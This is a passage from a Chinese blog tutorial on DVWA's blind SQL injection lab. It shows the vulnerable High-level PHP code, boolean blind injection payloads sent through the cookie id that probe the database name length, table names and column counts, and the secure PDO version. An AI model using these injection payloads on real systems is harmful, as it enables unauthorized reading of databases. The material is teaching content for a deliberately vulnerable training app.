class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $getid  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>; </span><br><span class="line">    $result = mysql_query( $getid ); <span class="comment">// Removed 'or die' to suppress mysql errors </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = @mysql_numrows( $result ); <span class="comment">// The '@' character suppresses errors </span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123; </span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Might sleep a random amount </span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123; </span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">        header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示<strong>基于布尔的盲注</strong>：</p>
+<blockquote>
+<p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
+<p>抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</p>
+</blockquote>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered? </span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123; </span><br><span class="line">        <span class="comment">// Check the database </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results </span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123; </span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't! </span></span><br><span class="line">            header( $_SERVER[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="wlfsky 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="wlfsky 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    wlfsky
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://wlfsky.com/2018/01/18/DVWA之SQL-Injection-Blind/" title="DVWA之SQL Injection(Blind)">http://wlfsky.com/2018/01/18/DVWA之SQL-Injection-Blind/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/DVWA教程/" rel="tag"><i class="fa fa-tag"></i> DVWA教程</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/17/DVWA之SQL-Injection/" rel="next" title="DVWA之SQL Injection">
+                <i class="fa fa-chevron-left"></i> DVWA之SQL Injection
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+<span class="jiathis_txt">分享到：</span>
+<a class="jiathis_button_fav">收藏夹</a>
+<a class="jiathis_button_copy">复制网址</a>
+<a class="jiathis_button_email">邮件</a>
+<a class="jiathis_button_weixin">微信</a>
+<a class="jiathis_button_qzone">QQ空间</a>
+<a class="jiathis_button_tqq">腾讯微博</a>
+<a class="jiathis_button_douban">豆瓣</a>
+<a class="jiathis_button_share">一键分享</a>
+
+<a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+var jiathis_config={
+  data_track_clickback:true,
+  summary:"",
+  shortUrl:false,
+  hideMore:false
+}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/cathand.jpg"
+                alt="wlfsky" />
+            
+              <p class="site-author-name" itemprop="name">wlfsky</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+			  <a title="收藏到书签，偶尔High一下^_^" rel="alternate" class="mw-harlem_shake_slow wobble shake" href='javascript:(function() {
+    function c() {
+        var e = document.createElement("link");
+        e.setAttribute("type", "text/css");
+        e.setAttribute("rel", "stylesheet");
+        e.setAttribute("href", f);
+        e.setAttribute("class", l);
+        document.body.appendChild(e)
+    }
+ 
+    function h() {
+        var e = document.getElementsByClassName(l);
+        for (var t = 0; t < e.length; t++) {
+            document.body.removeChild(e[t])
+        }
+    }
+ 
+    function p() {
+        var e = document.createElement("div");
+        e.setAttribute("class", a);
+        document.body.appendChild(e);
+        setTimeout(function() {
+            document.body.removeChild(e)
+        }, 100)
+    }
+ 
+    function d(e) {
+        return {
+            height : e.offsetHeight,
+            width : e.offsetWidth
+        }
+    }
+ 
+    function v(i) {
+        var s = d(i);
+        return s.height > e && s.height < n && s.width > t && s.width < r
+    }
+ 
+    function m(e) {
+        var t = e;
+        var n = 0;
+        while (!!t) {
+            n += t.offsetTop;
+            t = t.offsetParent
+        }
+        return n
+    }
+ 
+    function g() {
+        var e = document.documentElement;
+        if (!!window.innerWidth) {
+            return window.innerHeight
+        } else if (e && !isNaN(e.clientHeight)) {
+            return e.clientHeight
+        }
+        return 0
+    }
+ 
+    function y() {
+        if (window.pageYOffset) {
+            return window.pageYOffset
+        }
+        return Math.max(document.documentElement.scrollTop, document.body.scrollTop)
+    }
+ 
+    function E(e) {
+        var t = m(e);
+        return t >= w && t <= b + w
+    }
+ 
+    function S() {
+        var e = document.createElement("audio");
+        e.setAttribute("class", l);
+        e.src = i;
+        e.loop = false;
+        e.addEventListener("canplay", function() {
+            setTimeout(function() {
+                x(k)
+            }, 500);
+            setTimeout(function() {
+                N();
+                p();
+                for (var e = 0; e < O.length; e++) {
+                    T(O[e])
+                }
+            }, 15500)
+        }, true);
+        e.addEventListener("ended", function() {
+            N();
+            h()
+        }, true);
+        e.innerHTML = " <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>";
+        document.body.appendChild(e);
+        e.play()
+    }
+ 
+    function x(e) {
+        e.className += " " + s + " " + o
+    }
+ 
+    function T(e) {
+        e.className += " " + s + " " + u[Math.floor(Math.random() * u.length)]
+    }
+ 
+    function N() {
+        var e = document.getElementsByClassName(s);
+        var t = new RegExp("\\b" + s + "\\b");
+        for (var n = 0; n < e.length; ) {
+            e[n].className = e[n].className.replace(t, "")
+        }
+    }
+ 
+    var e = 30;
+    var t = 30;
+    var n = 350;
+    var r = 350;
+    var i = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3";
+    var s = "mw-harlem_shake_me";
+    var o = "im_first";
+    var u = ["im_drunk", "im_baked", "im_trippin", "im_blown"];
+    var a = "mw-strobe_light";
+    var f = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css";
+    var l = "mw_added_css";
+    var b = g();
+    var w = y();
+    var C = document.getElementsByTagName("*");
+    var k = null;
+    for (var L = 0; L < C.length; L++) {
+        var A = C[L];
+        if (v(A)) {
+            if (E(A)) {
+                k = A;
+                break
+            }
+        }
+    }
+    if (A === null) {
+        console.warn("Could not find a node of the right size. Please try a different page.");
+        return
+    }
+    c();
+    S();
+    var O = [];
+    for (var L = 0; L < C.length; L++) {
+        var A = C[L];
+        if (v(A)) {
+            O.push(A)
+        }
+    }
+})()'><i class="fa fa-music"></i> High</a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/wlfreesky" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:wlfsky@hotmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/5484401731" target="_blank" title="微博">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://music.163.com/#/user/home?id=387055149" target="_blank" title="网易云音乐">
+                    
+                      <i class="fa fa-fw fa-music"></i>网易云音乐</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bbs.ichunqiu.com/portal.php" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bbs.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://loudong.360.cn/" title="补天" target="_blank">补天</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.owasp.org.cn/owasp-project/2017-owasp-top-10" title="OWASP top10" target="_blank">OWASP top10</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://prompt.ml/0" title="prompt(1)" target="_blank">prompt(1)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.wechall.net/challs" title="WeChall" target="_blank">WeChall</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://redtiger.labs.overthewire.org/" title="RedTiger" target="_blank">RedTiger</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.somd5.com/" title="SOMD5" target="_blank">SOMD5</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tool.lu/" title="在线工具" target="_blank">在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.xctf.org.cn/" title="XCTF社区" target="_blank">XCTF社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xsspt.com/index.php?do=login" title="XSS平台" target="_blank">XSS平台</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DVWA简介"><span class="nav-number">1.</span> <span class="nav-text">DVWA简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Injection-Blind"><span class="nav-number">2.</span> <span class="nav-text">SQL Injection (Blind)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手工盲注思路"><span class="nav-number">2.1.</span> <span class="nav-text">手工盲注思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low"><span class="nav-number">3.</span> <span class="nav-text">Low</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-判断是否存在注入，注入是字符型还是数字型"><span class="nav-number">3.2.</span> <span class="nav-text">1.判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-猜解当前数据库名"><span class="nav-number">3.3.</span> <span class="nav-text">2.猜解当前数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-猜解数据库中的表名"><span class="nav-number">3.4.</span> <span class="nav-text">3.猜解数据库中的表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-猜解表中的字段名"><span class="nav-number">3.5.</span> <span class="nav-text">4.猜解表中的字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-猜解数据"><span class="nav-number">3.6.</span> <span class="nav-text">5.猜解数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-判断是否存在注入，注入是字符型还是数字型-1"><span class="nav-number">3.7.</span> <span class="nav-text">1.判断是否存在注入，注入是字符型还是数字型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-猜解当前数据库名-1"><span class="nav-number">3.8.</span> <span class="nav-text">2.猜解当前数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-猜解数据库中的表名-1"><span class="nav-number">3.9.</span> <span class="nav-text">3.猜解数据库中的表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-猜解表中的字段名-1"><span class="nav-number">3.10.</span> <span class="nav-text">4.猜解表中的字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-猜解数据-1"><span class="nav-number">3.11.</span> <span class="nav-text">5.猜解数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium"><span class="nav-number">4.</span> <span class="nav-text">Medium</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High"><span class="nav-number">5.</span> <span class="nav-text">High</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible"><span class="nav-number">6.</span> <span class="nav-text">Impossible</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wlfsky</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">13.2k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user">本站访客数</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人次
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye">本站总访问量</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    document.getElementById("live2dcanvas").style.width = '75px';
+    document.getElementById("live2dcanvas").style.height = '150px';
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/wanko.model.json", 0.5);});
+})();
+</script>
+
+
+</body>
+</html>
